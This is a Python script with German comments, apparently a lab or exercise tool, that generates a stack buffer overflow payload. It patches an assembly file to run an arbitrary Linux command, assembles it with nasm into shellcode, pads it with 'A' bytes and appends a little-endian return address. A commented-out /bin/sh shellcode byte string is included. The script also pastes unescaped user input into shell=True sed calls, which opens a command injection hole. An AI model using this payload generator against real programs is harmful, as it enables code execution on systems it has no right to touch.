#! /usr/bin/python3
import sys
import codecs
import os
import subprocess


# TODO: was tun, falls Parameter mit "A" am Ende übergeben
# TODO: Modified script zwischenspeichern
# TODO: Mögliche Fehlerfälle abfangen
# TODO: Möglicherweise shellcode als string in script speichern
if len(sys.argv) == 4:
    try:
        address = codecs.decode(sys.argv[1], "hex")
        address = address[::-1]
    except:
        print("Bitte Adresse in Hexadezimal angeben!")
        sys.exit(0)

    # shellcode = b"\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x14\x5a\x52\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31\xc0\xb0\x3b\x48\x31\xd2\x0f\x05\xe8\xe7\xff\xff\xff\x6c\x73\x20\x2d\x6c\x41"
    # shellcode.replace()
    # test if argument in sys.arg[3] is a string
    if isinstance(sys.argv[3], str):
        # save argv[3] in a variable
        pathParameter = sys.argv[3]

        # save length of argv[3] in variable
        pathParameterLength = len(pathParameter)

    else:
        print("Bitte Linux Befehl als String angeben!")
        sys.exit(0)

    if os.path.isfile(sys.argv[2]):
        path = sys.argv[2]
        subprocess.run("sed -i 's/rdx+5/rdx+{}/' {}".format(pathParameterLength, path), shell=True)
        # Hashtag als Trennzeichen, damit "/" in Commands möglich sind, evtl. durch bessere Alternative ersetzen
        subprocess.run("sed -i 's#ls -l#{}#' {}".format(pathParameter, path), shell=True)
        subprocess.run(" nasm -f bin {} -o a.bin".format(path), shell=True)
        subprocess.run("./dumpshellcode.py a.bin > a.txt", shell=True)
    else:
        print("Datei existiert nicht!")
        sys.exit(0)

    f = open("a.txt", "r+")
    shellcode = f.read()
    shellcode = bytes(shellcode, 'utf-8')
    shellcode = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
    f.close()

    os.system("rm a.txt")
    os.system("rm a.bin")

    padding_size= 224 - (len(shellcode)) - 8
    os.write(1,shellcode + b"A" * padding_size + address)
else:
    print("Wie folgt zu Benutzen:", "Programmname:" ,sys.argv[0] , "Bufferadresse", "Assemblerprogramm", "'Linux Bash Command'")
    sys.exit(0)
